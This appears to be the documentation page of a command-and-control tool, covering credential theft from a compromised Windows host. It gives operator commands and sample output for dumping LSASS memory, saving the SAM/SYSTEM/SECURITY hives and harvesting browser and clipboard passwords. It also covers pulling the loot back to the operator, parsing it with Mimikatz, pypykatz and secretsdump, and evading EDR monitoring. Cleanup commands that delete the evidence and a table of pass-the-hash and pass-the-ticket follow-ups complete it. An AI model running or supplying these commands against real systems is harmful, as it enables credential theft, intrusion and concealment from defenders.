# Credential Access

Dump credentials from LSASS, SAM, browsers, and the clipboard. All output returns to the operator via the encrypted command channel.

---

## Prerequisites

Most credential access techniques require elevated privileges:
- LSASS dump: **SYSTEM or local administrator with SeDebugPrivilege**
- SAM dump: **local administrator**
- Browser creds: **same user context as the browser** (no admin needed)
- Clipboard: **same user context** (no admin needed)

If the agent is running as a standard user, perform token escalation first (see [Token Manipulation](15-token-manipulation.md)).

---

## LSASS Dump

LSASS (Local Security Authority Subsystem Service) holds plaintext credentials, NTLM hashes, Kerberos tickets, and other authentication material for logged-in users.

```
❯ creds lsass a1b2
[*] Initiating LSASS dump via MiniDumpWriteDump...
[+] LSASS dump completed.
    Saved to: C:\Windows\Temp\lsass_dump_20260425.dmp
    Size: 42 MB

# Download the dump file
❯ files download a1b2 "C:\Windows\Temp\lsass_dump_20260425.dmp" /loot/lsass.dmp
```

Then parse offline with Mimikatz or pypykatz:
```bash
# On your machine
pypykatz lsa minidump /loot/lsass.dmp

# Or via Mimikatz (on an offline/isolated Windows machine)
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**Custom output path:**
```
❯ creds lsass a1b2 --output "C:\ProgramData\upd.dmp"
```

**How it works internally:** The agent uses `MiniDumpWriteDump` (the same Windows API that creates crash dumps). The resulting file is a standard Windows minidump that Mimikatz, pypykatz, and similar tools can parse.

**OPSEC considerations:**
- `MiniDumpWriteDump` is among the most-monitored API calls for LSASS — every mature EDR watches for it
- Apply `evasion unhook` before dumping to remove userland hooks
- Consider `DuplicateHandle` method (requesting LSASS handle via a trusted process) for better evasion
- PPL (Protected Process Light) on LSASS prevents direct `OpenProcess` — requires kernel bypass
- Rename the dump file to something benign before downloading (`.dmp` extension is sometimes flagged in transit)

**Alternative when LSASS is PPL-protected:** Use a kernel driver exploit or WER (Windows Error Reporting) abuse — the agent implements a WER fallback automatically when the standard path fails.

---

## SAM Database Dump

The SAM (Security Account Manager) database stores local user account NTLM hashes. Combined with the SYSTEM hive (for boot key decryption), it yields every local account's hash.

```
❯ creds sam a1b2
[*] Saving SAM/SYSTEM/SECURITY hives...
[+] SAM dump completed.
    Files saved to: C:\Windows\Temp\sam_dump\

❯ files download a1b2 "C:\Windows\Temp\sam_dump\SAM" /loot/SAM
❯ files download a1b2 "C:\Windows\Temp\sam_dump\SYSTEM" /loot/SYSTEM
❯ files download a1b2 "C:\Windows\Temp\sam_dump\SECURITY" /loot/SECURITY
```

Parse offline:
```bash
# impacket-secretsdump
secretsdump.py -sam /loot/SAM -system /loot/SYSTEM -security /loot/SECURITY LOCAL

# Output:
# [*] Target system bootKey: 0x...
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash):
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**How it works:** The SAM database is locked by the kernel while Windows is running. The agent uses `RegSaveKey` (Volume Shadow Copy fallback if needed) to save copies of the locked hive files.

**What you get:**
- Local user NTLM hashes (pass-the-hash in the same domain)
- Cached domain credentials (MSCachev2, requiring offline cracking)
- DPAPI master keys (from SECURITY hive)

---

## Browser Credentials

Extract saved passwords from Chrome, Edge, Brave, and Firefox.

```
❯ creds browser a1b2
[*] Harvesting browser credentials...
[+] Browser credentials retrieved.

Chrome/Edge/Brave:
  URL: https://internal.corp.local
  Username: jsmith@corp.local
  Password: Summer2024!

  URL: https://vpn.corp.com
  Username: john.smith
  Password: CorporateVPN#2023

Firefox:
  URL: https://mail.corp.local
  Username: jsmith
  Password: MailPass123
```

**How it works:**

*Chrome / Edge / Brave:*
1. Read the encrypted `Login Data` SQLite database from `%LOCALAPPDATA%\Google\Chrome\User Data\Default\`
2. Decrypt the AES key using Windows DPAPI (`CryptUnprotectData`)
3. Decrypt each stored password using the AES key

*Firefox:*
1. Read `logins.json` from the Firefox profile directory
2. Use the NSS library (Firefox ships with `nss3.dll`) to decrypt via `PK11SDR_Decrypt`

**Why this is useful:** Users frequently store credentials to:
- Internal web applications and portals
- VPN clients
- Email/Exchange webmail
- Developer portals and code repositories
- Cloud provider consoles

These credentials often work for lateral movement, cloud access, or privilege escalation.

**Privilege needed:** Same user context as the browser session. No admin required — these are the current user's credentials encrypted with their own DPAPI key.

---

## Clipboard

Read the current contents of the Windows clipboard.

```
❯ creds clipboard a1b2
[*] Reading clipboard content...
[+] Clipboard content:

P@ssword123!Summer2024
```

**When to use:**
- After observing the user open a password manager (1Password, KeePass) — they likely copied a password
- After a remote desktop session where the user might have pasted credentials
- As part of a keylogger + clipboard monitoring combination

**Privilege needed:** Same user session. No admin required.

---

## Credential Usage After Dumping

| Credential Type | Tool | Use |
|-----------------|------|-----|
| NTLM hash | `psexec.py`, `wmiexec.py`, Impacket | Pass-the-Hash lateral movement |
| Cleartext password | Any | Direct authentication |
| Kerberos TGT | `ticketer.py` | Pass-the-Ticket, Kerberoasting |
| DPAPI master key | `dpapi.py` | Decrypt other DPAPI secrets |
| Browser password | Direct use | VPN, cloud, internal portals |

---

## Cleanup

Always remove dump files from the target after downloading:

```
❯ cmd a1b2 "del C:\Windows\Temp\lsass_dump_20260425.dmp"
❯ cmd a1b2 "rmdir /s /q C:\Windows\Temp\sam_dump"
```
